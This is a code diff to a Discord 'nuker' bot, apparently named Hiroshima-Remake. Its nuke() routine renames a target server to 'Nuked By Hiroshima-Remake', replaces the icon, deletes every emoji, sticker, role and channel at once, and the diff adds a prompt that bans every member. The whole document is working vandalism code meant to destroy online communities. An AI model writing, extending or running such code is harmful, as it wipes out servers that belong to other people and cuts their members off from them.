@@ -6,36 +6,54 @@ import { selectedGuild } from "../alert/getGuild.js";
 import EmojiManager from "./emoji.js";
 import pc from "picocolors";
 import logger from "../logging/logger.js";
+import MemberManager from "./member.js";
+import readline from "readline";
+
+const rl = readline.createInterface({
+  input: process.stdin,
+  output: process.stdout,
+});
+
 export default async function nuke() {
   const guild = await client.guilds.fetch(selectedGuild.id);
   const bot = await guild.members.fetch(client.user.id);
 
   if (!(await checkPermissions(bot))) return;
   console.log(pc.green(`Nuking Server: ${guild.name}`));
-  console.log(pc.yellow("changing the server name..."));
-  await logger.info("changing the server name...");
+  console.log(pc.yellow("Changing the server name..."));
+
+  await logger.info("Changing the server name...");
   await guild.setName("Nuked By Hiroshima-Remake");
-  console.log(pc.green("server name changed successfully"));
-  await logger.info("server name changed successfully");
-  console.log(pc.yellow("changing server icon..."));
-  await logger.info("changing server icon...");
+
+  console.log(pc.green("Server name changed successfully"));
+  await logger.info("Server name changed successfully");
+
+  console.log(pc.yellow("Changing server icon..."));
+  await logger.info("Changing server icon...");
   await guild.setIcon(
     "https://i.ibb.co/WN9MmvJs/the-kingth-of-kutet-thukuna.jpg"
   );
-  console.log(pc.green("server icon changed successfully"));
-  await logger.info("server icon changed successfully");
 
-  const deleteEmojis = EmojiManager.deleteAllEmojis(guild);
-  const deleteStickers = EmojiManager.deleteAllSticker(guild);
-  const deleteRoles = RoleManager.deleteAllRoles(guild);
-  const deleteChannels = ChannelManager.deleteAllChannels(guild);
+  console.log(pc.green("Server icon changed successfully"));
+  await logger.info("Server icon changed successfully");
 
-  await deleteEmojis;
-  await deleteStickers;
-  await deleteRoles;
-  await deleteChannels;
+  // Delete everything asynchronously
+  await Promise.all([
+    EmojiManager.deleteEveryEmoji(guild),
+    EmojiManager.deleteEverySticker(guild),
+    RoleManager.deleteEveryRole(guild),
+    ChannelManager.deleteEveryChannel(guild),
+  ]);
 
-  const createChannels = ChannelManager.createChannel(guild);
-
-  await createChannels;
+  rl.question(
+    pc.yellow("Do you want to ban everyone from the server? (y/n): "),
+    async (answer) => {
+      if (answer.toLowerCase().startsWith("y")) {
+        await MemberManager.banEveryone(guild);
+      }
+      rl.close();
+    }
+  );
+  // Create channels after deletions
+  await ChannelManager.createChannel(guild);
 }
